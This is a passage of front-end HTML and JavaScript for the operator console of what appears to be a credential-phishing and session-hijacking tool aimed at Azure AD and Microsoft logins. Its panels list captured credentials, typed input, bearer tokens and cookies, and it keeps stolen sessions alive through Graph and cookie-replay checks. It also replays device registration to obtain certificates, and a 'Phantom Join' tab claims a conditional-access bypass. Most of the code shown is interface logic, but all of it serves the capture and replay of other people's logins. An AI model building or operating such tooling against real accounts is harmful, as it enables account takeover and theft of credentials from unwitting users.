        <div class="config-row"><label style="color:#94a3b8">Intune phases (8 + 9)</label><label class="toggle"><input type="checkbox" id="phantom-intune" onchange="document.getElementById('phantom-intune-fields').style.display=this.checked?'block':'none'"><span class="sl"></span></label></div>
        <div id="phantom-intune-fields" style="display:none">
          <div class="config-row"><label style="color:#94a3b8">Intune host</label><input id="phantom-intune-host" class="cfg-input cfg-input-wide" placeholder="svc.manage.microsoft.com:443"></div>
          <div class="config-row"><label style="color:#94a3b8">Hybrid domain</label><input id="phantom-hybrid" class="cfg-input cfg-input-wide" placeholder="corp.target.com"></div>
        </div>
        <hr style="border:none;border-top:1px solid #222;margin:14px 0 10px">
        <div style="display:flex;gap:8px">
          <button id="phantom-run-btn" class="btn" style="flex:1" onclick="phantomStart()">▶ Run</button>
          <button id="phantom-stop-btn" class="btn btn-danger" style="display:none" onclick="phantomStop()">■ Stop</button>
        </div>
        <div id="phantom-hint" style="color:#78859b;font-size:12px;margin-top:8px"></div>
      </div>
      <div style="flex:1;display:flex;flex-direction:column;min-width:0">
        <div style="padding:8px 14px;border-bottom:1px solid #222;background:#0d1117;display:flex;align-items:center;gap:10px">
          <span style="color:#94a3b8;font-size:12px">Phase:</span>
          <span id="phantom-phase" style="color:#fbbf24;font-size:13px;font-weight:600">—</span>
          <span style="flex:1"></span>
          <span id="phantom-runinfo" style="color:#78859b;font-size:12px"></span>
        </div>
        <pre id="phantom-log" style="flex:1;margin:0;padding:10px 14px;background:#0a0e15;color:#cbd5e1;font-size:12px;overflow:auto;font-family:'SF Mono',Monaco,monospace;line-height:1.45;white-space:pre-wrap;word-break:break-word"></pre>
        <div id="phantom-findings" style="display:none;padding:10px 14px;border-top:1px solid #222;background:#0d1117;max-height:240px;overflow-y:auto"></div>
      </div>
    </div>
  </div>

  <div class="data-panel" id="panel-saved" style="display:none">
    <h2 style="font-size:14px;color:#cbd5e1;margin-bottom:12px">Saved Sessions</h2>
    <div style="display:flex;gap:8px;margin-bottom:16px">
      <input id="new-sess-name" class="cfg-input" style="width:150px" placeholder="Name">
      <input id="new-sess-url" class="cfg-input" style="flex:1" placeholder="Login URL">
      <button class="btn" onclick="createSaved()">Create</button>
    </div>
    <div id="saved-list"></div>
  </div>

  <div class="data-panel" id="panel-creds" style="display:none">
    <h2 style="font-size:14px;color:#cbd5e1;margin-bottom:12px">Captured Credentials</h2>
    <div id="creds-list"></div>
  </div>

  <div class="data-panel" id="panel-devices" style="display:none">
    <h2 style="font-size:14px;color:#cbd5e1;margin-bottom:12px">Device Profiles
      <span style="color:#78859b;font-weight:normal;font-size:13px">— register from a connecting capture or add a generic device; launch Playwright with the saved bundle</span>
    </h2>
    <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:center">
      <button class="btn" onclick="openDeviceFromCaptureModal()">Register from capture…</button>
      <button class="btn" onclick="openDeviceManualModal()">Add device…</button>
      <span style="flex:1"></span>
      <label style="color:#78859b;font-size:13px">Default start URL:</label>
      <input id="dev-start-url" class="cfg-input" style="width:320px" placeholder="https://… (used when launching)">
      <button class="btn" style="padding:3px 10px;font-size:13px" onclick="send({cmd:'list_devices'})">Refresh</button>
    </div>
    <div id="devices-list"></div>
    <h2 style="font-size:14px;color:#fed7aa;margin:24px 0 4px 0">Registered devices (DRS)
      <span style="color:#78859b;font-weight:normal;font-size:13px">— credentials issued by Azure AD device-registration replay (⚡ button on Flow Trace rows). Cert + key persisted to <code>$DATA_DIR/device_credentials/</code>.</span>
    </h2>
    <div id="drs-credentials-list" style="margin-top:6px"></div>
    <div id="device-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center"></div>
  </div>

  <div class="data-panel" id="panel-keepalive-log" style="display:none">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
      <h2 style="font-size:14px;color:#cbd5e1;margin:0">Keep-Alive Log <span style="color:#78859b;font-weight:normal">(last 12 hours)</span></h2>
      <div style="display:flex;gap:6px;align-items:center">
        <button class="btn" style="padding:3px 12px;font-size:13px" onclick="kaDiagnoseFirst()" title="Quick diagnostic on the most recent site — token claims + captured-state + local exp check. Sub-second, no network round-trip.">Debug first site</button>
        <button class="btn" style="padding:3px 12px;font-size:13px;border-color:#0ea5e9;color:#7dd3fc" onclick="kaDiagnoseDeep()" title="Re-run the diagnostic with the slow checks: Graph /me + cookie-replay GET. Up to 30s — only after a quick pass identified the site to inspect.">Run full trace</button>
        <button class="btn" style="padding:3px 12px;font-size:13px" onclick="send({cmd:'get_keepalive_log'})">Refresh</button>
      </div>
    </div>
    <div id="keepalive-debug-result" style="display:none;font-size:13px;background:#0a0a18;border:1px solid #0c4a6e;border-radius:4px;padding:10px 14px;margin-bottom:10px"></div>
    <div id="keepalive-log-list" style="font-size:13px"></div>
  </div>

  <div class="log-area" id="panel-logs">
    <div class="log-header">
      <span style="color:#cbd5e1;font-size:13px" id="tab-title">All Logs <span style="color:#8893a7" id="lcount">(0)</span></span>
      <div class="log-actions">
        <span class="autoscroll on" id="as-btn" onclick="toggleAS()">auto-scroll</span>
        <span class="autoscroll" id="hide-sid-btn" title="Blank out the [session_id] column in the All Logs view" onclick="toggleHideSid()">show sid</span>
        <button onclick="clearTab()">Clear</button>
        <button onclick="exportTab()">Export</button>
      </div>
    </div>
    <div class="filter-bar">
      <button class="fbtn active" onclick="setFilter('all',this)">All</button>
      <button class="fbtn" onclick="setFilter('auth',this)">Auth</button>
      <button class="fbtn" onclick="setFilter('cookies',this)">Cookies</button>
      <button class="fbtn" onclick="setFilter('capture',this)">Captured</button>
      <button class="fbtn" onclick="setFilter('nav',this)">Nav</button>
      <button class="fbtn" onclick="setFilter('errors',this)">Errors</button>
      <button class="fbtn" onclick="setFilter('requests',this)">Requests</button>
      <button class="fbtn" onclick="setFilter('challenge',this)" title="Auth challenges — username/password/MFA/KMSI/consent/CA blocks/AADSTS errors">Challenges</button>
      <span style="flex:1"></span>
      <label style="font-size:12px;color:#78859b;align-self:center">Service:</label>
      <select id="svc-filter" class="cfg-input" style="width:auto;min-width:140px" onchange="setServiceFilter(this.value)">
        <option value="all">all services</option>
      </select>
    </div>
    <div class="captured-bar" id="cap-bar" style="display:none">
      <h3>Captured Input</h3>
      <div id="cap-items"></div>
    </div>
    <div class="log-scroll" id="lscroll"><div id="lbox"></div></div>
  </div>
</div>

<script>
// login_urls come from configCache.login_urls
const _apiKey=new URLSearchParams(location.search).get('api_key')||'';
function apiFetch(url,opts={}){
  if(!opts.headers)opts.headers={};
  if(_apiKey)opts.headers['Authorization']='Bearer '+_apiKey;
  return fetch(url,opts);
}

let ws=null, autoScroll=true, currentTab='all', currentFilter='all', currentService='all';
let seenServices=new Set();
let configCache={}, knownSessions={}, savedSessions=[], sitesCache=[];
let devicesCache=[], devicePresets=[];
// Phantom Join — single active run state. `phantomWs` is the WS to
// /api/phantom/run while a run is in flight; null otherwise.
// `phantomRunning` is read by renderTabs() to badge the tab title.
let phantomWs=null, phantomRunning=false, phantomLogLines=[];
let allLogs=[], authProxyLogs=[], stats={tok:0,ck:0,au:0,inp:0};
let flowBySession={}, flowSelectedSid='', flowSelectedSeq=null, taintValues=[];
// Sessions that have captured flow but aren't active browser sessions —
// synthetic dashboard-test traces (test_<tool>_<site_id>) and ended sessions.
// Seeded from the init `flow_sessions` payload and kept current as live flow
// rows arrive, so the Flow Trace dropdown lists them alongside browser sessions.
let flowSessionMeta={}; // sid -> {sid,count,browser,tool,site_id}
// Cross-tab "pinned" session — set explicitly whenever the operator
// picks a session from a Flow Trace or Index dropdown. Both tabs
// honour this on render so switching between tabs doesn't reset
// the selection. Persists across tab switches until the operator
// picks a different session OR the underlying session is removed.
let pinnedSid='';
function setPinnedSid(sid){
  if(!sid)return;
  pinnedSid=sid;
  flowSelectedSid=sid;
  if(typeof idxSelectedSid!=='undefined')idxSelectedSid=sid;
  // Sync both dropdowns when present so they stay in lockstep.
  const fs=document.getElementById('flow-sid-select');
  if(fs && fs.value!==sid && [...fs.options].some(o=>o.value===sid))fs.value=sid;
  const ix=document.getElementById('idx-sid-select');
  if(ix && ix.value!==sid && [...ix.options].some(o=>o.value===sid))ix.value=sid;
}
let flowMarkers={};  // sid -> {start, end}
let flowSelectedSeqs={}; // sid -> Set<number> of checkbox-picked rows
let idxActiveSeqs=new Set(); // union of seqs across all flagged index items
let idxFlaggedItems=new Set(); // keys of items currently flagged (show red dots on Flow Trace). Each key is `group + '␟' + itemKey`.
let idxCollapsedGroups=new Set(); // name-level group collapse state, key is `section-group + '|' + name`.
// Simple helper — return the Set for the current session (creating if needed)
function _flowPicks(){if(!flowSelectedSid)return new Set();if(!flowSelectedSeqs[flowSelectedSid])flowSelectedSeqs[flowSelectedSid]=new Set();return flowSelectedSeqs[flowSelectedSid]}
let ollamaModels=[];  // populated by Test connection

function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function mask(s){return configCache.mask_captured_input?'•'.repeat(Math.min(s.length,20)):esc(s)}

// ── Send command over WS ──
// Returns true if the message actually went out. A dropped command
// (socket mid-reconnect after a server restart) used to vanish silently,
// leaving callers like analyzeFlow() spinning forever — callers that care
// now check the return value.
function send(msg){
  if(ws&&ws.readyState===1){ws.send(JSON.stringify(msg));return true}
  console.warn('send: dropped (WS not open, readyState='+(ws?ws.readyState:'null')+'):', msg&&msg.cmd);
  return false;
}

// ── Classify ──
function cls(m){
  if(m.includes('BEARER_TOKEN'))return'bearer';if(m.includes('TOKEN CAPTURED')||m.includes('TOKEN.'))return'token';
  if(m.includes('SET-COOKIE'))return'cookie';if(m.includes('REQ_AUTH')||m.includes('RESP_AUTH'))return'auth';
  if(m.includes('BODY_AUTH_FIELD'))return'body-auth';if(m.includes('CAPTURED_INPUT='))return'input';
  if(m.includes('CAPTURED ')&&m.includes('cookies'))return'capture';
  if(m.startsWith('CHALLENGE '))return'challenge';
  if(m.startsWith('▶ ')||m.startsWith('✓ ')||m.startsWith('✗ '))return'tool';
  if(m.includes('ERROR')||m.includes('FATAL')||m.includes('REQ_FAILED'))return'error';
  if(m.includes('REDIRECT'))return'redirect';if(m.includes('URL_CHANGED'))return'url';
  if(m.includes('NAVIGATE')||m.includes('PAGE_LOAD')||m.includes('DOM_READY')||m.includes('FRAME_NAV'))return'nav';
  if(m.includes('HEARTBEAT'))return'heartbeat';if(m.includes('STEP'))return'step';
  if(m.includes('REQ '))return'req';if(m.includes('RESP '))return'resp';
  if(m.includes('Config changed'))return'config';return'default';
}
function filterOk(c){
  if(currentFilter==='all')return true;
  if(currentFilter==='auth')return['bearer','token','auth','body-auth'].includes(c);
  if(currentFilter==='cookies')return c==='cookie';
  if(currentFilter==='capture')return['capture','input'].includes(c);
  if(currentFilter==='nav')return['nav','url','redirect','step'].includes(c);
  if(currentFilter==='errors')return c==='error';
  if(currentFilter==='requests')return['req','resp'].includes(c);
  if(currentFilter==='challenge')return c==='challenge';
  return true;
}

// ── Tabs ──
function ensureSession(sid,info){
  if(!knownSessions[sid]){
    knownSessions[sid]={login_url:info?.login_url||sid,site_id:info?.site_id||'',user_id:info?.user_id||'',started_at:info?.started_at||null,logged_in_at:info?.logged_in_at||null,trace:!!info?.trace,logs:[],captured_inputs:[]};
    renderTabs();
    if(currentTab==='flow')refreshFlowSessionList();
    if(currentTab==='index')refreshIndexSessionList();
  } else {
    let changed=false;
    if(info?.login_url)knownSessions[sid].login_url=info.login_url;
    if(info?.site_id)knownSessions[sid].site_id=info.site_id;
    if(info?.started_at && !knownSessions[sid].started_at){knownSessions[sid].started_at=info.started_at;changed=true;}
    if(info?.logged_in_at && knownSessions[sid].logged_in_at!==info.logged_in_at){knownSessions[sid].logged_in_at=info.logged_in_at;changed=true;}
    if(info && 'trace' in info && knownSessions[sid].trace!==!!info.trace){
      knownSessions[sid].trace=!!info.trace;
      changed=true;
    }
    // Only overwrite user_id when a non-empty one arrives — otherwise we'd
    // clobber an already-captured identity with the initial blank register.
    if(info?.user_id){
      knownSessions[sid].user_id=info.user_id;
      changed=true;
    }
    if(changed){
      renderTabs();
      if(currentTab==='flow')refreshFlowSessionList();
      if(currentTab==='index')refreshIndexSessionList();
    }
  }
}
function _idxFormatTs(t){
  if(!t)return '';
  const d=new Date(t*1000);
  const pad=n=>String(n).padStart(2,'0');
  const today=new Date();
  const sameDay=d.getFullYear()===today.getFullYear()&&d.getMonth()===today.getMonth()&&d.getDate()===today.getDate();
  const hm=`${pad(d.getHours())}:${pad(d.getMinutes())}`;
  return sameDay?hm:`${pad(d.getMonth()+1)}/${pad(d.getDate())} ${hm}`;
}
// Common label builder — "hostname · user@example.com · HH:MM"
function sessionLabel(sid, maxHost){
  // Synthetic dashboard-test traces: test_<tool>_<site_id>. tool is a fixed
  // set so the match is unambiguous even when the site_id itself has
  // underscores. Render as "🧪 <tool> · <site>" with the credential's host /
  // username when we can resolve it, else the raw site id.
  const tm=sid.match(/^test_(ropc|token|adopat|aaa|graph)_(.*)$/);
  if(tm){
    const toolLabel={ropc:'ROPC',token:'v1+v2 token',adopat:'ADO PAT',aaa:'AAA token',graph:'Graph test'}[tm[1]]||tm[1];
    const siteId=tm[2]; let site=siteId;
    const sc=(sitesCache||[]).find(x=>x.id===siteId);
    if(sc&&sc.data){try{site=new URL(sc.data.login_url).hostname}catch(e){} if(sc.data.username)site+=' · '+sc.data.username;}
    const meta=flowSessionMeta[sid];
    const when=meta&&meta.ts?' · '+_idxFormatTs(meta.ts):'';
    return `🧪 ${toolLabel} · ${site}${when}`;
  }
  const s=knownSessions[sid]||{};
  let host=sid.slice(0,maxHost||32);
  try{host=new URL(s.login_url).hostname}catch(e){}
  const parts=[host];
  if(s.user_id)parts.push(s.user_id);
  // Prefer the moment the user was identified; fall back to session start.
  const ts=s.logged_in_at||s.started_at;
  if(ts)parts.push(_idxFormatTs(ts));
  return parts.join(' · ');
}
function renderTabs(){
  // ── Sessions bar (own row above the main tabs) ──
  const sbar=document.getElementById('sessions-bar');
  if(sbar){
    const sids=Object.keys(knownSessions);
    if(!sids.length){
      sbar.innerHTML='<span style="color:#475569;font-size:12px;padding:6px 16px">No sessions yet — open one on :8091</span>';
    } else {
      const isActive=knownSessions[currentTab]!==undefined;
      let s=`<span style="color:#78859b;font-size:12px;padding:8px 10px 8px 16px">Sessions (${sids.length}):</span>`;
      s+=`<span class="session-select-wrap ${isActive?'active':''}">`;
      s+=`<select class="session-select" onchange="this.value&&topSessionPicked(this.value)">`;
      if(!isActive)s+=`<option value="" selected>— pick one —</option>`;
      for(const sid of sids){
        const short=sessionLabel(sid, 28);
        s+=`<option value="${sid}"${currentTab===sid?' selected':''}>${esc(short)}</option>`;
      }
      s+=`</select>`;
      if(isActive)s+=`<button class="tab-close" onclick="closeTab('${currentTab}')" title="Close session and clear data">&times;</button>`;
      s+=`</span>`;
      sbar.innerHTML=s;
    }
  }

  // ── Main tabs (no session entry here — it lives in sessions-bar above) ──
  const bar=document.getElementById('tab-bar');
  let h=`<button class="tab-btn ${currentTab==='all'?'active':''}" onclick="switchTab('all')">All Logs</button>`;
  h+=`<button class="tab-btn ${currentTab==='saved'?'active':''}" onclick="switchTab('saved')">Saved Sessions</button>`;
  h+=`<button class="tab-btn ${currentTab==='creds'?'active':''}" onclick="switchTab('creds')">Captured Data</button>`;
  h+=`<button class="tab-btn ${currentTab==='devices'?'active':''}" onclick="switchTab('devices')">Devices${devicesCache.length?` <span style="color:#78859b;font-size:13px">(${devicesCache.length})</span>`:''}</button>`;
  h+=`<button class="tab-btn ${currentTab==='keepalive-log'?'active':''}" onclick="switchTab('keepalive-log')">Keep-Alive</button>`;
  h+=`<button class="tab-btn ${currentTab==='auth-proxy'?'active':''}" onclick="switchTab('auth-proxy')">Proxy Traffic <span style="color:#78859b;font-size:13px">(${authProxyLogs.length})</span></button>`;
  {
    const n = Object.keys(_analysisInProgress||{}).length;
    const tag = n > 0
      ? ` <span title="Ollama analysis running" style="display:inline-block;width:8px;height:8px;border:2px solid #60a5fa;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle"></span>`
      : '';
    h+=`<button class="tab-btn ${currentTab==='flow'?'active':''}" onclick="switchTab('flow')">Flow Trace${tag}</button>`;
  }
  h+=`<button class="tab-btn ${currentTab==='index'?'active':''}" onclick="switchTab('index')">Index</button>`;
  // Phantom Join — only render the tab when allow_phantom_join is on,
  // so a stack that's not configured for the feature doesn't dangle a
  // dead surface. Visibility is decided live from configCache.
  if(configCache.allow_phantom_join){
    h+=`<button class="tab-btn ${currentTab==='phantom'?'active':''}" onclick="switchTab('phantom')" title="Azure AD CA bypass via phantom device — authorized engagements only">Phantom${phantomRunning?' <span style="color:#fbbf24">⚡running</span>':''}</button>`;
  }
  h+=`<button class="tab-btn ${currentTab==='settings'?'active':''}" onclick="switchTab('settings')">Settings</button>`;
  h+=`<button class="tab-btn ${currentTab==='docs'?'active':''}" onclick="switchTab('docs')">Docs</button>`;
  bar.innerHTML=h;
}
function closeTab(sid){
  if(!knownSessions[sid])return;
  // Derive site_id: stored explicitly, or strip trailing _timestamp from session id
  let site_id=knownSessions[sid].site_id||'';
  if(!site_id){const p=sid.lastIndexOf('_');if(p>0)site_id=sid.slice(0,p)}
  // Delete session logs
  delete knownSessions[sid];
  // Delete captured credentials/cookies for this site
  if(site_id)send({cmd:'delete_credentials',site_id:site_id});
  // Switch to All Logs if we just closed the active tab
  if(currentTab===sid){currentTab='all'}
  renderTabs();switchTab(currentTab);
}
// Top-bar Sessions dropdown handler. When the current tab is one
// where session-selection drives the view (Flow Trace, Index), we
// just pin the new sid + re-render that tab — the operator
// expects to STAY on the analysis they were doing. For tabs where
// a session has its own per-session log view (the default "session
// tab" that switchTab(sid) opens), fall through to the original
// switch-to-session-log behaviour.
function topSessionPicked(sid){
  if(!sid)return;
  const stayOn=new Set(['flow','index']);
  if(stayOn.has(currentTab)){
    setPinnedSid(sid);
    if(currentTab==='flow'){
      // Update Flow Trace dropdown + reload the flow if we don't
      // already have it cached.
      const fs=document.getElementById('flow-sid-select');
      if(fs)fs.value=sid;
      flowSelectedSid=sid;
      if(!flowBySession[sid])send({cmd:'get_flow',session_id:sid});
      renderFlow();
    } else if(currentTab==='index'){
      const ix=document.getElementById('idx-sid-select');
      if(ix)ix.value=sid;
      idxSelectedSid=sid;
      if(!flowBySession[sid])send({cmd:'get_flow',session_id:sid});
      renderIndex();
    }
    return;
  }
  // Default behaviour for All Logs / Captured Data / Devices /
  // Keep-Alive / etc — open the session's own log view.
  switchTab(sid);
}
function switchTab(tab){
  currentTab=tab;renderTabs();
  const panels=['saved','creds','devices','keepalive-log','flow','index','phantom','docs','settings'];
  document.getElementById('panel-logs').style.display=panels.includes(tab)?'none':'';
  document.getElementById('panel-saved').style.display=tab==='saved'?'':'none';
  document.getElementById('panel-creds').style.display=tab==='creds'?'':'none';
  const devPanel=document.getElementById('panel-devices');
  if(devPanel)devPanel.style.display=tab==='devices'?'':'none';
  document.getElementById('panel-keepalive-log').style.display=tab==='keepalive-log'?'':'none';
  const flowPanel=document.getElementById('panel-flow');
  flowPanel.style.display=tab==='flow'?'flex':'none';
  const idxPanel=document.getElementById('panel-index');
  if(idxPanel)idxPanel.style.display=tab==='index'?'flex':'none';
  const phantomPanel=document.getElementById('panel-phantom');
  if(phantomPanel)phantomPanel.style.display=tab==='phantom'?'flex':'none';
  document.getElementById('panel-docs').style.display=tab==='docs'?'':'none';
  const settingsPanel=document.getElementById('panel-settings');
  settingsPanel.style.display=tab==='settings'?'flex':'none';
  if(tab==='saved'){renderSaved();return}
  if(tab==='creds'){renderCreds();return}
  if(tab==='devices'){renderDevices();return}
  if(tab==='keepalive-log'){send({cmd:'get_keepalive_log'});return}
  if(tab==='flow'){refreshFlowSessionList();return}
  if(tab==='index'){refreshIndexSessionList();return}
  if(tab==='phantom'){renderPhantom();return}
  if(tab==='docs'){renderDocs();return}
  if(tab==='settings'){return}
  rerender();
  const cap=document.getElementById('cap-bar');
  if(tab!=='all'&&tab!=='auth-proxy'&&knownSessions[tab]){cap.style.display='';renderCapInputs(tab)}else{cap.style.display='none'}
  document.getElementById('tab-title').innerHTML=tab==='all'?'All Logs <span style="color:#8893a7" id="lcount"></span>'
    :tab==='auth-proxy'?'Proxy Traffic <span style="color:#8893a7" id="lcount"></span>'
    :`Session: ${esc(sessionLabel(tab))} <span style="color:#8893a7" id="lcount"></span>`;
}
function renderCapInputs(sid){
  const s=knownSessions[sid],el=document.getElementById('cap-items');
  if(!s){el.innerHTML='<div style="color:#78859b;font-size:13px">No input yet</div>';return}
  // Handle both array and object formats for captured_inputs
  const inputsArray = Array.isArray(s.captured_inputs) ? s.captured_inputs :
                      (typeof s.captured_inputs === 'object' && s.captured_inputs ? Object.values(s.captured_inputs) : []);
  if(!inputsArray.length){el.innerHTML='<div style="color:#78859b;font-size:13px">No input yet</div>';return}
  el.innerHTML=inputsArray.map(v=>`<div><span class="cap-label">CAPTURED_INPUT=</span><span class="cap-val">${mask(v)}</span></div>`).join('');
}

// ── Logs ──
function addLog(entry){
  allLogs.push(entry);if(allLogs.length>10000)allLogs=allLogs.slice(-8000);
  noteService(entry.category);
  const c=cls(entry.message),sid=entry.session_id||'';
  const isAuthProxy=entry.category==='auth_proxy';
  if(isAuthProxy){authProxyLogs.push(entry);if(authProxyLogs.length>5000)authProxyLogs=authProxyLogs.slice(-4000);renderTabs();}
  if(sid){ensureSession(sid,{});knownSessions[sid].logs.push(entry);
    if(c==='input'){const m=entry.message.match(/CAPTURED_INPUT=(.+?)\s+\(flushed/);if(m){knownSessions[sid].captured_inputs.push(m[1]);if(currentTab===sid)renderCapInputs(sid)}}
  }
  if(c==='bearer'||c==='token')stats.tok++;if(c==='cookie')stats.ck++;
  if(c==='auth'||c==='body-auth')stats.au++;if(c==='input')stats.inp++;
  document.getElementById('st-tok').textContent=stats.tok;document.getElementById('st-ck').textContent=stats.ck;
  document.getElementById('st-au').textContent=stats.au;document.getElementById('st-inp').textContent=stats.inp;
  if(currentTab==='saved'||currentTab==='creds')return;
  if(currentTab==='auth-proxy'){if(!isAuthProxy)return}
  else if(currentTab!=='all'&&sid!==currentTab)return;
  if(!filterOk(c))return;
  if(!serviceOk(entry))return;
  appendLine(entry,c);
  const lc=document.getElementById('lcount');if(lc)lc.textContent=`(${currentTab==='all'?allLogs.length:currentTab==='auth-proxy'?authProxyLogs.length:(knownSessions[currentTab]?.logs.length||0)})`;
  if(autoScroll)document.getElementById('lscroll').scrollTop=999999;
}
// Pull a leading "#N " or "  #N " off the message and return [seq, rest].
// Only matches at the very start of the message or after a 2-space indent
// (the pattern backend REQ_AUTH / SET-COOKIE / BEARER_TOKEN lines use).
function _extractSeq(msg){
  let m=msg.match(/^#(\d+)\s+(.*)$/);
  if(m)return {seq:Number(m[1]), rest:m[2], indent:''};
  m=msg.match(/^(\s+)#(\d+)\s+(.*)$/);
  if(m)return {seq:Number(m[2]), rest:m[3], indent:m[1]};
  return {seq:null, rest:msg, indent:''};
}

// Is this message response-side (RESP / REDIRECT / SET-COOKIE /
// RESP_AUTH / TOKEN / BODY_AUTH_FIELD / BEARER_TOKEN (response) /
// REQ_FAILED / response|flow-response handler error)? If yes we'll
// render it indented under the REQ line with the same seq.
function _isRespSide(rest){
  if(!rest)return false;
  return /^(RESP|REDIRECT|REQ_FAILED|response handler error|flow response error)\b/.test(rest)
      || /^<<<\s/.test(rest)
      || /^>>> (BEARER_TOKEN \(response\)|TOKEN|BODY_AUTH_FIELD)/.test(rest);
}

function appendLine(e,c){
  const d=document.createElement('div');d.className=`ll c-${c}`;
  // Session-id column is the third field; can be blanked out via the
  // hide_session_id_in_logs toggle so the left edge stays aligned across
  // mixed-session views when the sid prefix is visual noise.
  const hideSid=!!configCache.hide_session_id_in_logs;
  const sidHtml=(currentTab==='all'&&e.session_id&&!hideSid)
    ? `<span class="sid">[${esc(e.session_id.slice(0,15))}]</span> `
    : (currentTab==='all'&&e.session_id&&hideSid)
      ? `<span class="sid empty">[]</span> `
      : '';
  let msg=e.message;
  if(configCache.mask_captured_input&&msg.includes('CAPTURED_INPUT=')){msg=msg.replace(/CAPTURED_INPUT=(.+?)(\s+\(flushed|$)/,(m,val,rest)=>'CAPTURED_INPUT='+'•'.repeat(Math.min(val.length,20))+rest)}
  // Split off a leading #N so we can render it in its own column. This is
  // the same seq that identifies the row in Flow Trace, so make it a
  // clickable jump target when we know which session it belongs to.
  const ex=_extractSeq(msg);
  // Response-side lines get indented under the preceding REQ line; the
  // test is on the trimmed body (independent of any leading "  " indent
  // the backend already put on sub-rows).
  const trimmed=ex.rest.replace(/^\s+/,'');
  if(_isRespSide(trimmed))d.classList.add('resp-side');

  let seqHtml;
  if(ex.seq!=null){
    const sid=e.session_id||'';
    const clickAttr=sid
      ? ` onclick="_logSeqClick('${esc(sid).replace(/'/g,'&#39;')}',${ex.seq})"`
      : '';
    seqHtml=`<span class="seq"${clickAttr} title="Jump to this transaction in Flow Trace">#${ex.seq}</span>`;
  } else {
    seqHtml=`<span class="seq empty">#</span>`;
  }
  // Column order: seq (left) · timestamp · session-id · message.
  d.innerHTML=`${seqHtml}<span class="ts">${e.time}</span>${sidHtml}${esc(ex.indent)}${esc(ex.rest)}`;
  document.getElementById('lbox').appendChild(d);
}

// Clicking a #N in the log takes you straight to that row in Flow Trace.
function _logSeqClick(sid, seq){
  flowSelectedSid=sid;
  flowSelectedSeq=seq;
  idxActiveSeqs=new Set([seq]);
  const sel=document.getElementById('flow-sid-select');
  if(sel && ![...sel.options].some(o=>o.value===sid))refreshFlowSessionList();
  if(sel)sel.value=sid;
  switchTab('flow');
  setTimeout(()=>{
    const entries=flowBySession[sid]||[];
    const entry=entries.find(x=>x.seq===seq);
    if(entry)renderFlowDetail(entry);
    renderFlow();
  },50);
}
function rerender(){
  document.getElementById('lbox').innerHTML='';
  const logs=currentTab==='all'?allLogs:currentTab==='auth-proxy'?authProxyLogs:(knownSessions[currentTab]?.logs||[]);
  let shown=0;
  for(const e of logs){const c=cls(e.message);if(filterOk(c)&&serviceOk(e)){appendLine(e,c);shown++}}
  const lc=document.getElementById('lcount');if(lc)lc.textContent=`(${shown}/${logs.length})`;
  if(autoScroll)document.getElementById('lscroll').scrollTop=999999;
}
function setFilter(f,btn){currentFilter=f;document.querySelectorAll('.fbtn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');rerender()}
function setServiceFilter(s){currentService=s;rerender()}
function noteService(cat){
  if(!cat||seenServices.has(cat))return;
  seenServices.add(cat);
  const sel=document.getElementById('svc-filter');if(!sel)return;
  const opt=document.createElement('option');opt.value=cat;opt.textContent=cat;sel.appendChild(opt);
}
function serviceOk(entry){
  return currentService==='all'||entry.category===currentService;
}
function toggleAS(){autoScroll=!autoScroll;const b=document.getElementById('as-btn');b.className=`autoscroll ${autoScroll?'on':''}`}
function toggleHideSid(){
  const cur=!!configCache.hide_session_id_in_logs;
  configCache.hide_session_id_in_logs=!cur;
  cfgSet('hide_session_id_in_logs',!cur);
  _paintHideSidBtn();
  rerender();
}
function _paintHideSidBtn(){
  const b=document.getElementById('hide-sid-btn');if(!b)return;
  const on=!!configCache.hide_session_id_in_logs;
  b.className=`autoscroll ${on?'on':''}`;
  b.textContent=on?'sid hidden':'show sid';
}
function clearTab(){if(currentTab==='all')allLogs=[];else if(currentTab==='auth-proxy'){authProxyLogs=[];renderTabs()}else if(knownSessions[currentTab])knownSessions[currentTab].logs=[];document.getElementById('lbox').innerHTML=''}
function exportTab(){const logs=currentTab==='all'?allLogs:currentTab==='auth-proxy'?authProxyLogs:(knownSessions[currentTab]?.logs||[]);
  const t=logs.map(e=>`${e.time} [${e.session_id||'-'}] [${e.category}] ${e.message}`).join('\n');
  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([t],{type:'text/plain'}));
  a.download=`debug-${currentTab}-${new Date().toISOString().slice(0,19)}.log`;a.click()}

// ── Flow Trace ──
function refreshFlowSessionList(){
  const sel=document.getElementById('flow-sid-select');
  // Union: active browser sessions + any session that has captured flow
  // (synthetic dashboard-test traces, ended sessions). Without the union the
  // ROPC / token / ADO PAT / AAA / Graph test traces are recorded but never
  // selectable here to send to the LLM.
  const sids=[...new Set([
    ...Object.keys(knownSessions),
    ...Object.keys(flowSessionMeta),
    ...Object.keys(flowBySession),
  ])].filter(Boolean);  // drop any empty-string sid → no blank rows in the list
  if(!sids.length){sel.innerHTML='<option value="">(no active sessions)</option>';document.getElementById('flow-timeline').innerHTML='<div style="padding:20px;color:#78859b;font-size:13px;text-align:center">Start a browser session to capture flow.</div>';return}
  // Pick the default in priority order:
  //   1. The pinned cross-tab session (set whenever the operator
  //      picked a session in EITHER Flow Trace or Index).
  //   2. Active flagged seqs hint (when Index has flagged items
  //      pointing at a specific session).
  //   3. The current local selection.
  //   4. The current dropdown value.
  // Whichever wins must be a still-known sid; otherwise fall through.
  const candidates=[
    pinnedSid,
    (idxActiveSeqs.size>0&&idxSelectedSid)?idxSelectedSid:'',
    flowSelectedSid,
    sel.value,
  ].filter(Boolean);
  let prev='';
  for(const c of candidates){if(sids.includes(c)){prev=c;break}}
  if(!prev)prev=sids[0];
  sel.innerHTML=sids.map(sid=>{
    const short=sessionLabel(sid);
    // ⚡ when this session's flow contains a DRS-scoped Bearer
    // token (replayable for device registration); ☐ otherwise.
    // The indicator is "checkbox-like" so it reads at a glance and
    // stays accurate even before the operator has clicked into the
    // session — flow data lands incrementally and the dropdown is
    // re-rendered on each flow_history / DRS-bearing flow row.
    const drs=_sessionHasDrsToken(sid)?'⚡':'☐';
    return `<option value="${sid}"${sid===prev?' selected':''}>${drs} ${esc(short)} — ${sid.slice(-10)}</option>`;
  }).join('');
